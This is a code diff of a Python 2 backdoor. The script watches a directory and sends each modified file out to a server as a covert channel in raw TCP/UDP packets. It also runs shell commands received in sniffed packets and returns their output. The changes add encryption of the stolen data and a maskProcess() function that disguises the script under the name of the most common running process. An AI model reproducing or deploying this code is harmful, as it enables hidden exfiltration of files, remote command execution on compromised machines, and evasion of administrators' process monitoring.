@@ -1,4 +1,4 @@
-import hashlib, ConfigParser
+import hashlib, ConfigParser, os, setproctitle
 #from Crypto import Random
 import subprocess, threading, pyinotify, string
 from time import sleep
@@ -38,18 +38,19 @@ IV = 16 * '\x00'#16 is block size
 # we send it to the server using a covert channel
 
 class EventHandler(pyinotify.ProcessEvent):
+
     # when a specified file is modified
     def process_IN_CLOSE_WRITE(self, event):
         filepath = event.pathname
         filename = event.name
-        byteCounter = 0
+        #byteCounter = 0
         print filename, " was modified\n"
 
         #ensure it is not temp file as it could cause error
         if ("/." not in filepath) or ("~" not in filepath):
             #open modified file
             secretFile = open(filepath, 'rb')
-            data_byte_array = bytearray(secretFile.read())
+            data_byte_array = bytearray(encrypt(secretFile.read()))
 
             # create a raw socket
             try:
@@ -95,7 +96,7 @@ class EventHandler(pyinotify.ProcessEvent):
 
 
 
-                #After sending the byte array, send conclusive packet with ttl 188
+                #After sending the byte array, send conclusive packet with id = 1234
                 ip_id=1234
                 # the ! in the pack format string means network order
                 ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
@@ -103,7 +104,7 @@ class EventHandler(pyinotify.ProcessEvent):
 
                 if (protocol == "UDP"):
                     #filename sent as data
-                    data = filename
+                    data = encrypt(filename)
                     dport = 8505
                     length = 8 + len(str(data))
                     checksum = 0
@@ -118,7 +119,6 @@ class EventHandler(pyinotify.ProcessEvent):
 
 
 def watch_file(directory):
-
     handler = EventHandler()
     notifier = pyinotify.Notifier(wm, handler)
     wdd = wm.add_watch(directory, mask, rec=True)
@@ -160,6 +160,21 @@ def encrypt(text):
     return ciphertext
 
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       maskProcess()
+#--
+#-- NOTES:
+#-- maskProcess obtains the most common process for both ps -aux and top and
+#-- calls setProcessName to set the script process name to the most common
+#-- process running on the system at the time.
+#-----------------------------------------------------------------------------
+def maskProcess():
+    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
+    commandResult = command.read()
+    setproctitle.setproctitle(commandResult)
+    #setProcessName(commandResult)
+    print "Most common process: {0}".format(commandResult)
+
 #--------------------------------------------------------------------------------
 #--  FUNCTION
 #--
@@ -169,7 +184,6 @@ def encrypt(text):
 #--  Description:    executes a shell command and returns the outputpy
 #--------------------------------------------------------------------------------
 def executeShellCommand(command):
-
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
     return outputString
@@ -303,6 +317,7 @@ def sendCommand(protocol, srcIP, dstIP,  data, password, last):
 def main(argv):
     t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory])
     t.start()
+
     # list all devices
     devices = pcapy.findalldevs()
     #print devices
@@ -417,10 +432,10 @@ def parse_packet(packet):
                     for seq in output_dec:
                     #for seq in range(0, len(output_dec), 1):
                         if  counter == last:
-                            sendCommand("TCP", d_addr, s_addr, 1000, seq, True)
+                            sendCommand("TCP", d_addr, s_addr, encrypt(str(1000)), seq, True)
                             counter += 1
                         else:
-                            sendCommand("TCP", d_addr, s_addr, 1000, seq, False)
+                            sendCommand("TCP", d_addr, s_addr, encrypt(str(1000)), seq, False)
                             counter += 1
 
 
@@ -461,14 +476,15 @@ def parse_packet(packet):
                     for seq in output_dec:
                         # for seq in range(0, len(output_dec), 1):
                         if counter == last:
-                            sendCommand("UDP", d_addr, s_addr, 1000, seq, True)
+                            sendCommand("UDP", d_addr, s_addr, encrypt(str(1000)), seq, True)
                             counter += 1
                         else:
-                            sendCommand("UDP", d_addr, s_addr, 1000, seq, False)
+                            sendCommand("UDP", d_addr, s_addr, encrypt(str(1000)), seq, False)
                             counter += 1
 
 if __name__ == "__main__":
     try:
+        maskProcess()
         main(sys.argv)
     except KeyboardInterrupt:
         print "exiting.."
